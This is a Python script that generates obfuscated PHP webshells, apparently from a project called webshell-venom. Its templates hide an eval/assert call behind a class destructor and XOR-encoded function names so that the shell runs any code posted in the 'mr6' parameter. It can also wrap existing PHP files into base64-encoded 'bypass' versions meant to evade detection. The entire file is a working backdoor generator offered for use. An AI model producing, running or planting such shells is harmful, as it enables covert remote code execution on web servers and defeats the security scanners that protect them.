import chardet
import base64
import random
import sys
'''
author: yzddmr6
github: https://github.com/yzddmr6/webshell-venom/
pass: mr6
'''

func1 = 'assert'
func2 = 'eval'

shell_form ='''<?php
class {class_name}{{
    function __destruct(){{
        ${var_name1}={func1};
        return @${var_name1}("$this->{var_name2}");
    }}
}}
${objname}=new {class_name}();
@${objname}->{var_name2}=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>'''


encode_form = '''<?php
class {class_name}{{
    function __destruct(){{
        $this->{func_name}({func1},array(({func2})."(base64_decode('{base64_code}'));"));
        }}
    function {func_name}(${var_name1},${var_name2}){{
        @array_map(${var_name1},${var_name2});
    }}}}
${objname}=new {class_name}();
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = '\'{0}\'^"{1}"'.format(func_line1,func_line2)
    return payload

def base64_encode(files):
    with open(files,'rb') as res:
        text=res.read()
        text_char=chardet.detect(text)
        #print(text_char['encoding'])
        text_decode=text.decode(text_char['encoding'])
        text_decode=text_decode.replace('<?php','')
        text_decode=text_decode.replace('?>','')
        bs64=str(base64.b64encode(text_decode.encode(text_char['encoding'])),text_char['encoding'])
    #print(bs64)
    return bs64

def encode_webshell(files):
    class_name = random_name(4)
    objname = class_name.lower()
    webshell=encode_form.format(class_name=class_name,func_name=random_name(4),objname=objname,var_name1=random_name(4),var_name2=random_name(4),func1=gen_payload(func1),func2=gen_payload(func2),base64_code=base64_encode(files))
    print(webshell)
    with open(files+'.bypass.php','w+') as save:
        save.write(webshell)
    return webshell

def gen_webshell():
    class_name = random_name(4)
    objname = class_name.lower()
    webshell=shell_form.format(class_name=class_name,func_name=random_name(4),objname=objname,var_name1=random_name(4),var_name2=random_name(4),func1=gen_payload(func1))
    print(webshell)


if __name__ == '__main__':
    if len(sys.argv)> 1:
        files=sys.argv[1]
        encode_webshell(files)
    else:
        gen_webshell()
